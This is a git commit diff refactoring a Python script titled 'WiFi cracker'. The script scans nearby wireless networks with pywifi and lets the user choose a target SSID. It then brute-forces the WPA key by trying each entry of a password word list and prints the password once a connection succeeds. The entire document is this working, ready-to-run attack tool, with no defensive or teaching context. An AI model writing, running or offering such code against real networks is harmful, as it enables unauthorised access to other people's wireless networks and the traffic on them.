62f12ec833f8ea0f0efcc78e0c5cd36791ea0fdd
Sina <sina.programerr@gmail.com>
2022-10-25 21:32:14 +0330

    Refactor

--- main.py
+++ main.py
@@ -1,23 +1,27 @@
 from pywifi import const, PyWiFi, Profile
-from threading import Thread
 from termcolor import cprint
 from itertools import cycle
-from winsound import Beep
-from time import sleep
-from sys import stdout
+import winsound
+import time
 import os
+
+
+def beep():
+    winsound.Beep(700, 500)
+    winsound.Beep(1000, 500)
+
 
 def scan():
     interface.scan()
-    for i in range(52):
-        sleep(.15)
-        stdout.write(f'\r Scanning... {next(loading_chars)}')
-        
-    result = interface.scan_results()
-    
-    return result
+    for i in range(12):
+        for char in '/-\|':
+            print(f'\r Scanning... {char}', end='')
+            time.sleep(.15)
 
-def testwifi(ssid , password):
+    return interface.scan_results()
+
+
+def test_wifi(ssid, password):
     interface.disconnect()
     profile = Profile()
     profile.ssid = ssid
@@ -26,62 +30,65 @@ def testwifi(ssid , password):
     profile.cipher = const.CIPHER_TYPE_CCMP
     profile.key = password
     interface.connect(interface.add_network_profile(profile))
-    sleep(.7)
-    
+    time.sleep(.7)
+
     if interface.status() == const.IFACE_CONNECTED:
         interface.remove_network_profile(profile)
         return True
-    
+
     else:
         interface.remove_network_profile(profile)
         return False
-        
-    
-os.system('cls')        
 
-wifi = PyWiFi()
-interface = wifi.interfaces()[0]
-loading_chars = iter(cycle('/-\|'))
-colors = iter(cycle(['blue', 'red']))
-password_list = "password-list.txt"
 
-sleep(.5)
-print('\n Welcome to WiFi cracker(written by Sina.f)\n')
-sleep(1)
-
-hosts = scan()
-hosts = [host.ssid for host in hosts]
-
-if hosts:
+def select(items):
     print('\n')
-    for idx, host in enumerate(hosts, 1):
-        sleep(1)
-        print(f' {idx}_ {host}')
-        
-    sleep(1)
-    selected_host = input("\n Select a host to start cracking: ")
+    for idx, item in enumerate(items, 1):
+        print(f' {idx}_ {item}')
+        time.sleep(.7)
+
+    time.sleep(1)
+    selected_item = input("\n Select a host to start cracking: ")
 
     while True:
         try:
-            selected_host = int(selected_host)
-            assert selected_host <= len(hosts) and selected_host > 0
-            selected_host -= 1
+            selected_item = int(selected_item)
+            assert selected_item <= len(items) and selected_item > 0
+            selected_item -= 1
             break
-        
+
         except AssertionError:
-            print(f'\n "{selected_host}" is not a valid host number')
-            selected_host = input('\n Please enter a valid host: ')
-        
+            print(f'\n "{selected_item}" is not a valid host number')
+            selected_item = input('\n Please enter a valid host: ')
+
         except:
-            if selected_host in hosts:
-                selected_host = hosts.index(selected_host)
+            if selected_item in items:
+                selected_item = items.index(selected_item)
                 break
-            
+
             else:
-                print(f'\n "{selected_host}" is not a valid host name')
-                selected_host = input('\n Please enter a valid host: ')
-            
-    target = hosts[selected_host]
+                print(f'\n "{selected_item}" is not a valid host name')
+                selected_item = input('\n Please enter a valid host: ')
+
+
+    return items[selected_item]
+
+
+os.system('cls')
+
+wifi = PyWiFi()
+interface = wifi.interfaces()[0]
+colors = iter(cycle(['blue', 'red']))
+password_list = "password-list.txt"
+
+time.sleep(.5)
+print('\n Welcome to WiFi cracker(written by Sina.f)\n')
+time.sleep(1)
+
+hosts = [host.ssid for host in scan()]
+
+if hosts:
+    target = select(hosts)
     tests = 0
     print()
     
@@ -89,17 +96,15 @@ if hosts:
         for password in passlist.readlines():
             if len(password) < 8:
                 continue
-            
+
             color = next(colors)
             cprint(f' Testing: {password}', color=color)
             tests += 1
-            
-            if testwifi(target , password):
-                Beep(700 , 500)
-                Beep(1000 , 500) 
+
+            if test_wifi(target, password):
+                beep()
                 print()
                 print(format(' ', '-<30'))
-                # print('\n', format(' ', '-<30'), sep='')
                 cprint(f' PASSWORD: {password}', color='green')
                 print(f' {tests} Password tested!')
                 print(format(' ', '-<30'))
@@ -108,8 +113,8 @@ if hosts:
 else:
     print('\n\n No WiFi available!\n')
 
-   
-figlet =  '''\n
+
+figlet = '''\n
    _____ _                __ 
   / ____(_)              / _|
  | (___  _ _ __   __ _  | |_ 
@@ -120,7 +125,7 @@ figlet =  '''\n
 
 for line in figlet.splitlines():
     print(line)
-    sleep(.2)
+    time.sleep(.2)
 
-sleep(1)
-input(' Press enter to exit...')   
+time.sleep(1)
+input(' Press <enter> to exit...')
